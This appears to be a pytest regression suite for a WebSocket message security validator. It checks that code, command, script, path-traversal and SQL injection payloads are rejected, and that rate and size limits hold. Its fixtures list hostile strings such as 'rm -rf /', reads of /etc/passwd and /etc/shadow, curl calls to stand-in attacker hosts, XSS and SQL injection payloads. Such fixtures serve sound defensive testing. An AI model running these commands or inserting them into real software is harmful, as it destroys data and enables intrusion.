#!/usr/bin/env python3
"""
WebSocket Security Validator Regression Guard Tests
==================================================

Prevents regression in WebSocket security hardening implementation.
Tests comprehensive protection against RCE, injection, and protocol attacks.

Generated by TDD London School Swarm Agent for Phase 5 guard protection.
"""

import pytest
import asyncio
import json
import base64
from datetime import datetime, timedelta
from typing import Dict, Any, List
from unittest.mock import MagicMock, patch, AsyncMock

import sys
sys.path.insert(0, "src")

from src.security.websocket_security_validator import (
    WebSocketSecurityValidator,
    SecurityError,
    SecurityThreat,
    SecurityThreatLevel,
    AttackType,
    MessageSchema,
    SafeEvaluator
)


class TestWebSocketSecurityRegression:
    """Regression tests for WebSocket security validator."""
    
    @pytest.fixture
    def validator(self):
        """Create security validator instance."""
        return WebSocketSecurityValidator()
    
    @pytest.fixture
    def sample_client_info(self):
        """Sample client information for testing."""
        return {
            "remote_addr": "127.0.0.1",
            "user_agent": "TestClient/1.0"
        }
    
    @pytest.mark.asyncio
    async def test_blocks_eval_injection_attacks(self, validator, sample_client_info):
        """CRITICAL: Must block all eval() based code injection attempts."""
        malicious_payloads = [
            '{"type": "test", "data": {"code": "eval(malicious_code)"}}',
            '{"type": "inference_submit", "data": "eval(__import__(\\"os\\").system(\\"rm -rf /\\"))"}',
            '{"type": "ping", "payload": "eval(open(\\"/etc/passwd\\").read())"}',
            '{"type": "connect", "params": {"eval": "exec(evil_payload)"}}',
            '{"message": "eval(subprocess.run([\'rm\', \'-rf\', \'.\']))"}',
            '{"code": "__import__(\'subprocess\').call([\'curl\', \'malicious.com\'])"}',
            '{"script": "compile(malicious, \'<string>\', \'exec\')"}',
        ]
        
        for payload in malicious_payloads:
            with pytest.raises(SecurityError) as exc_info:
                await validator.validate_message(payload, sample_client_info)
            
            threat = exc_info.value.threat
            assert threat.threat_type in [AttackType.CODE_INJECTION, AttackType.COMMAND_INJECTION]
            assert threat.severity in [SecurityThreatLevel.HIGH, SecurityThreatLevel.CRITICAL]
    
    @pytest.mark.asyncio
    async def test_blocks_command_injection_attacks(self, validator, sample_client_info):
        """CRITICAL: Must block command injection attempts."""
        command_payloads = [
            '{"type": "test", "data": "subprocess.run([\\"ls\\", \\"-la\\"])"}',
            '{"command": "os.system(\\"cat /etc/passwd\\")"}',
            '{"type": "inference_submit", "payload": "os.popen(\\"whoami\\").read()"}',
            '{"exec": "commands.getoutput(\\"rm -rf /\\")"}',
            '{"shell": "|rm -rf /tmp && echo done"}',
            '{"cmd": "bash -c \\"curl attacker.com\\""}',
            '{"powershell": "Get-Process"}',
        ]
        
        for payload in command_payloads:
            with pytest.raises(SecurityError) as exc_info:
                await validator.validate_message(payload, sample_client_info)
            
            threat = exc_info.value.threat
            assert threat.threat_type == AttackType.COMMAND_INJECTION
            assert threat.severity in [SecurityThreatLevel.HIGH, SecurityThreatLevel.CRITICAL]
    
    @pytest.mark.asyncio
    async def test_blocks_script_injection_attacks(self, validator, sample_client_info):
        """Must block JavaScript and script injection attacks."""
        script_payloads = [
            '{"html": "<script>alert(\\"XSS\\")</script>"}',
            '{"javascript": "javascript:alert(document.cookie)"}',
            '{"data": "onload=\\"malicious_function()\\""}',
            '{"content": "onerror=\\"steal_data()\\""}',
            '{"payload": "<img src=x onerror=\\"evil()\\">"}',
            '{"vbscript": "vbscript:msgbox(\\"attack\\")"}',
            '{"data": "data:text/html,<script>attack()</script>"}',
        ]
        
        for payload in script_payloads:
            with pytest.raises(SecurityError) as exc_info:
                await validator.validate_message(payload, sample_client_info)
            
            threat = exc_info.value.threat
            assert threat.threat_type == AttackType.SCRIPT_INJECTION
    
    @pytest.mark.asyncio
    async def test_blocks_path_traversal_attacks(self, validator, sample_client_info):
        """Must block path traversal attempts."""
        traversal_payloads = [
            '{"file": "../../../etc/passwd"}',
            '{"path": "..\\\\windows\\\\system32\\\\config\\\\sam"}',
            '{"data": "../../../../../../etc/shadow"}',
            '{"config": "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd"}',
            '{"access": "/proc/self/environ"}',
            '{"read": "c:\\\\windows\\\\system.ini"}',
        ]
        
        for payload in traversal_payloads:
            with pytest.raises(SecurityError) as exc_info:
                await validator.validate_message(payload, sample_client_info)
            
            threat = exc_info.value.threat
            assert threat.threat_type == AttackType.PATH_TRAVERSAL
    
    @pytest.mark.asyncio
    async def test_blocks_sql_injection_attacks(self, validator, sample_client_info):
        """Must block SQL injection attempts."""
        sql_payloads = [
            '{"query": "1\\"; DROP TABLE users; --"}',
            '{"search": "admin\' OR \'1\'=\'1"}',
            '{"filter": "UNION SELECT * FROM passwords"}',
            '{"data": "1\' AND 1=1--"}',
            '{"param": "xp_cmdshell \'dir\'"}',
            '{"sql": "SELECT * FROM information_schema.tables"}',
        ]
        
        for payload in sql_payloads:
            with pytest.raises(SecurityError) as exc_info:
                await validator.validate_message(payload, sample_client_info)
            
            threat = exc_info.value.threat
            assert threat.threat_type == AttackType.SQL_INJECTION
    
    @pytest.mark.asyncio
    async def test_rate_limiting_prevents_dos(self, validator, sample_client_info):
        """Test rate limiting prevents DoS attacks."""
        # Send many requests rapidly
        valid_payload = '{"type": "ping", "data": {}}'
        
        # First batch should succeed
        for i in range(10):
            await validator.validate_message(valid_payload, sample_client_info)
        
        # Exceed rate limit
        for i in range(60):  # Exceed max_requests_per_minute
            try:
                await validator.validate_message(valid_payload, sample_client_info)
            except SecurityError as e:
                if e.threat.threat_type == AttackType.DDOS:
                    break
        else:
            pytest.fail("Rate limiting did not trigger DoS protection")
    
    @pytest.mark.asyncio
    async def test_message_size_limits(self, validator, sample_client_info):
        """Test message size limits prevent resource exhaustion."""
        # Create oversized payload (>1MB)
        large_data = "x" * (1024 * 1024 + 1)
        oversized_payload = json.dumps({"type": "test", "data": large_data})
        
        with pytest.raises(SecurityError) as exc_info:
            await validator.validate_message(oversized_payload, sample_client_info)
        
        threat = exc_info.value.threat
        assert threat.threat_type == AttackType.DDOS
        assert "too large" in threat.description.lower()
    
    @pytest.mark.asyncio
    async def test_encoded_payload_detection(self, validator, sample_client_info):
        """Test detection of base64/hex encoded malicious payloads."""
        # Base64 encoded eval payload
        malicious_code = "eval(__import__('os').system('rm -rf /'))"
        encoded_payload = base64.b64encode(malicious_code.encode()).decode()
        
        payload = json.dumps({
            "type": "test",
            "data": {
                "encoded": encoded_payload
            }
        })
        
        with pytest.raises(SecurityError) as exc_info:
            await validator.validate_message(payload, sample_client_info)
        
        threat = exc_info.value.threat
        assert threat.threat_type == AttackType.CODE_INJECTION
        assert "encoded" in threat.description.lower()
    
    @pytest.mark.asyncio
    async def test_pydantic_schema_enforcement(self, validator, sample_client_info):
        """Test Pydantic schema enforcement prevents malformed messages."""
        invalid_schemas = [
            '{"type": "", "data": {}}',  # Empty type
            '{"type": "invalid_type!", "data": {}}',  # Invalid characters
            '{"type": "x" * 51, "data": {}}',  # Type too long
            '{"type": "test", "priority": 10}',  # Priority out of range
            '{"type": "test", "message_id": "id with spaces!"}',  # Invalid message_id
        ]
        
        for payload in invalid_schemas:
            with pytest.raises(SecurityError) as exc_info:
                await validator.validate_message(payload, sample_client_info)
            
            # Should be caught by schema validation
            assert "validation" in exc_info.value.threat.description.lower()
    
    @pytest.mark.asyncio
    async def test_allows_valid_messages(self, validator, sample_client_info):
        """Test that valid messages are allowed through."""
        valid_messages = [
            {
                "type": "ping",
                "data": {"timestamp": datetime.now().isoformat()}
            },
            {
                "type": "inference_submit",
                "data": {
                    "model": "test-model",
                    "input": "What is the weather like?",
                    "parameters": {"temperature": 0.7}
                },
                "message_id": "msg_12345",
                "priority": 2
            },
            {
                "type": "connect",
                "data": {"client_version": "1.0.0"},
                "request_id": "req_abcdef"
            }
        ]
        
        for message_dict in valid_messages:
            payload = json.dumps(message_dict)
            result = await validator.validate_message(payload, sample_client_info)
            
            assert result is not None
            assert result["type"] == message_dict["type"]
            assert "data" in result
    
    def test_safe_evaluator_blocks_dangerous_operations(self):
        """Test SafeEvaluator provides secure alternatives."""
        evaluator = SafeEvaluator()
        
        # Should work for literals
        result = evaluator.safe_literal_eval("[1, 2, 3]")
        assert result == [1, 2, 3]
        
        result = evaluator.safe_literal_eval('{"key": "value"}')
        assert result == {"key": "value"}
        
        # Should block dangerous expressions
        dangerous_expressions = [
            "__import__('os').system('rm -rf /')",
            "eval('malicious_code')",
            "open('/etc/passwd').read()",
            "subprocess.run(['ls'])",
        ]
        
        for expr in dangerous_expressions:
            with pytest.raises(ValueError):
                evaluator.safe_literal_eval(expr)
    
    def test_security_report_generation(self, validator):
        """Test security report generation."""
        # Generate some security events
        validator.security_events = [
            SecurityThreat(
                threat_type=AttackType.CODE_INJECTION,
                severity=SecurityThreatLevel.CRITICAL,
                description="Test threat",
                payload="test_payload",
                timestamp=datetime.now()
            )
        ]
        
        report = validator.get_security_report()
        
        assert "total_events" in report
        assert "threat_type_counts" in report
        assert "critical_events_24h" in report
        assert report["total_events"] >= 1


class TestWebSocketSecurityBehavioralContracts:
    """Behavioral contract tests for WebSocket security."""
    
    @pytest.fixture
    def validator(self):
        return WebSocketSecurityValidator()
    
    @pytest.fixture
    def client_info(self):
        return {"remote_addr": "127.0.0.1", "user_agent": "Test/1.0"}
    
    @pytest.mark.asyncio
    async def test_validation_always_returns_dict_or_raises(self, validator, client_info):
        """Contract: validate_message always returns dict or raises SecurityError."""
        test_messages = [
            '{"type": "ping", "data": {}}',
            '{"type": "pong"}',
            'invalid json',
            '{"type": "eval()", "data": {}}',
        ]
        
        for message in test_messages:
            try:
                result = await validator.validate_message(message, client_info)
                assert isinstance(result, dict), f"Non-dict result: {type(result)}"
                assert "type" in result, "Result missing required 'type' field"
            except SecurityError as e:
                # This is acceptable behavior
                assert isinstance(e.threat, SecurityThreat)
                assert hasattr(e.threat, 'threat_type')
                assert hasattr(e.threat, 'severity')
            except Exception as e:
                pytest.fail(f"Unexpected exception type: {type(e).__name__}: {e}")
    
    @pytest.mark.asyncio
    async def test_threat_detection_consistency(self, validator, client_info):
        """Contract: Same input should produce same threat detection results."""
        malicious_payload = '{"type": "test", "data": "eval(malicious)"}'
        
        # Run same validation multiple times
        results = []
        for _ in range(3):
            try:
                await validator.validate_message(malicious_payload, client_info)
                results.append(None)  # No exception
            except SecurityError as e:
                results.append((e.threat.threat_type, e.threat.severity))
        
        # All results should be the same
        first_result = results[0]
        assert all(r == first_result for r in results), \
            f"Inconsistent threat detection: {results}"
    
    @pytest.mark.asyncio
    async def test_rate_limiting_state_management(self, validator, client_info):
        """Contract: Rate limiting state should be properly managed."""
        valid_payload = '{"type": "ping", "data": {}}'
        
        # Initial state
        initial_stats = validator.get_security_report()
        initial_blocked_count = len(validator.blocked_ips)
        
        # Send some messages
        for _ in range(5):
            await validator.validate_message(valid_payload, client_info)
        
        # Check that rate limiting data was updated
        client_ip = client_info["remote_addr"]
        assert client_ip in validator.rate_limits
        assert len(validator.rate_limits[client_ip]) == 5
        
        # Blocked IPs should not change for valid requests
        assert len(validator.blocked_ips) == initial_blocked_count
    
    def test_security_threat_immutability(self, validator):
        """Contract: SecurityThreat objects should be immutable after creation."""
        threat = SecurityThreat(
            threat_type=AttackType.CODE_INJECTION,
            severity=SecurityThreatLevel.HIGH,
            description="Test threat",
            payload="test_payload"
        )
        
        original_type = threat.threat_type
        original_severity = threat.severity
        original_description = threat.description
        
        # Threat properties should be immutable
        # (dataclasses with frozen=True would enforce this)
        assert threat.threat_type == original_type
        assert threat.severity == original_severity
        assert threat.description == original_description
    
    @pytest.mark.asyncio
    async def test_error_handling_robustness(self, validator, client_info):
        """Contract: Validator should handle edge cases gracefully."""
        edge_cases = [
            "",  # Empty string
            None,  # None input (will cause error, should be handled)
            '{"type": "ping"',  # Malformed JSON
            '{"type": null}',  # Null type
            '{"data": {"nested": {"very": {"deep": "structure"}}}}',  # No type
            json.dumps({"type": "ping", "data": "x" * 10000}),  # Large but valid
        ]
        
        for case in edge_cases:
            try:
                if case is None:
                    # This will cause TypeError, which should be handled
                    with pytest.raises((SecurityError, TypeError)):
                        await validator.validate_message(case, client_info)
                else:
                    result = await validator.validate_message(case, client_info)
                    # If it doesn't raise, result should be valid
                    assert isinstance(result, dict)
            except SecurityError:
                # This is acceptable - security validation should be strict
                pass
            except Exception as e:
                # Other exceptions should be handled gracefully
                pytest.fail(f"Unhandled exception for input {repr(case[:50])}: {e}")